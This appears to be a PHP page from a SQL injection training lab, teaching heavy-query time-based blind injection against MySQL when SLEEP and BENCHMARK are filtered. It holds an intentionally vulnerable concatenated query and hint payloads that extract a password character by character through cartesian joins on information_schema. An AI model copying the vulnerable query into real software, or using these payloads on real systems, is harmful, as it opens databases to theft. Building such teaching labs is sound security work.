<?php
require_once __DIR__ . '/../../includes/db.php';

$mode = $_GET['mode'] ?? 'black';
$verify_error = null;

/* =====================
   MASTER PASSWORD VERIFY
===================== */
if (isset($_POST['admin_password'])) {
    $submitted = $_POST['admin_password'];

    $res = mysqli_query(
        $conn,
        "SELECT password FROM master_password LIMIT 1"
    );
    $row = mysqli_fetch_assoc($res);

    if ($row && $submitted === $row['password']) {
        $_SESSION['mysql_lab12_solved'] = true;
        header("Location: " . url_lab_from_slug("mysql/lab12", $mode));
        exit;
    } else {
        $verify_error = "Incorrect. Keep trying!";
    }
}
?>

<!-- Lab Description -->
<div class="card">
    <h3>Lab 12. Blind Time-Based: Heavy Query (no SLEEP)</h3>

    <h4>Scenario</h4>
    <p>
        An audit log search endpoint lets staff search events. The page <strong>always</strong>
        responds with <strong>&ldquo;Search complete.&rdquo;</strong> regardless of results.
        There is no boolean signal and no error output.
    </p>
    <p>
        Additionally, a <strong>keyword filter</strong> blocks <code>SLEEP</code> and
        <code>BENCHMARK</code>: the typical time-based functions are unavailable.
        You must use <strong>heavy queries</strong> (cartesian joins on
        <code>information_schema</code>) to generate a measurable time delay as your oracle.
    </p>

    <h4>Objective</h4>
    <p>
        Extract the <strong>password</strong> from the <code>master_password</code> table
        using heavy-query time-based blind injection. Submit the password below.
    </p>

    <h4>Hints</h4>
    <span class="hint-toggle" data-hint="hint1">&#128161; Click for hints</span>
    <div id="hint1" class="hint-content">
        1. Try <code>' OR SLEEP(2) -- -</code> -- you will get &ldquo;Blocked keyword detected&rdquo;.<br>
        2. Heavy query: <code>' OR IF(1=1, (SELECT count(*) FROM information_schema.columns A, information_schema.columns B), 0) -- -</code><br>
        3. The cartesian join creates O(n&sup2;) rows to count: causing a noticeable delay.<br>
        4. Conditional extraction: <code>' OR IF(ASCII(SUBSTRING((SELECT password FROM master_password LIMIT 1),1,1))=70, (SELECT count(*) FROM information_schema.columns A, information_schema.columns B), 0) -- -</code><br>
        5. If two joins are too fast, add a third: <code>information_schema.columns C</code>.<br>
        6. Automate with a script: time each request and compare against baseline.
    </div>


</div>

<!-- Verify Flag -->
<div class="card">
    <h4>Submit Master Password</h4>
    <form method="POST" class="form-row">
<input type="text" name="admin_password" class="input" placeholder="Enter the master password..." required>
        <button type="submit" class="btn btn-primary">Verify</button>
    </form>

    <?php if ($verify_error): ?>
        <div class="result-error result-box"><?= htmlspecialchars($verify_error) ?></div>
    <?php endif; ?>
</div>

<!-- Solved Banner -->
<?php if (!empty($_SESSION['mysql_lab12_solved'])): ?>

<div class="solved-banner">
    <span class="solved-icon">&#127942;</span>
    <div>
        <div class="solved-title">Lab Solved!</div>
        <div class="solved-desc">You successfully extracted the master password using heavy-query time-based blind SQL injection without SLEEP or BENCHMARK.</div>
    </div>
</div>

<?php else: ?>

<!-- Vulnerable Query Interface -->
<div class="card">
    <h4>Audit Log Search</h4>
    <form method="POST" class="form-row">
<input type="text" name="search" class="input" placeholder="Search events (try: login)" value="<?= htmlspecialchars($_POST['search'] ?? '') ?>">
        <button type="submit" class="btn btn-primary">Search</button>
    </form>
</div>

<?php
if (isset($_POST['search'])) {
    $search = $_POST['search'];

    // Keyword filter: blocks SLEEP and BENCHMARK
    if (stripos($search, 'sleep') !== false || stripos($search, 'benchmark') !== false) {
        echo '<div class="result-error result-box"><strong>Blocked keyword detected</strong>: the input contains a restricted function.</div>';
    } else {

        // INTENTIONALLY VULNERABLE: direct string concatenation
        $query = "SELECT * FROM audit_log WHERE event LIKE '%$search%'";

        // Show the executed query in a terminal block
        echo '<div class="terminal">';
        echo '  <div class="terminal-header">';
        echo '    <span class="terminal-dot red"></span>';
        echo '    <span class="terminal-dot yellow"></span>';
        echo '    <span class="terminal-dot green"></span>';
        echo '    <span class="terminal-title">MySQL Query</span>';
        echo '  </div>';
        echo '  <div class="terminal-body" data-highlight="sql">';
        echo '    <span class="prompt">mysql&gt; </span>' . htmlspecialchars($query);
        echo '  </div>';
        echo '</div>';

        // Execute. TIME-BASED BLIND: suppress errors, always show same response
        mysqli_report(MYSQLI_REPORT_OFF);

        @mysqli_query($conn, $query);

        // Always the same response: no boolean signal
        echo '<div class="result-data result-box"><strong>Search complete.</strong></div>';

        // Restore error reporting
        mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);
    }
}
?>

<?php endif; ?>
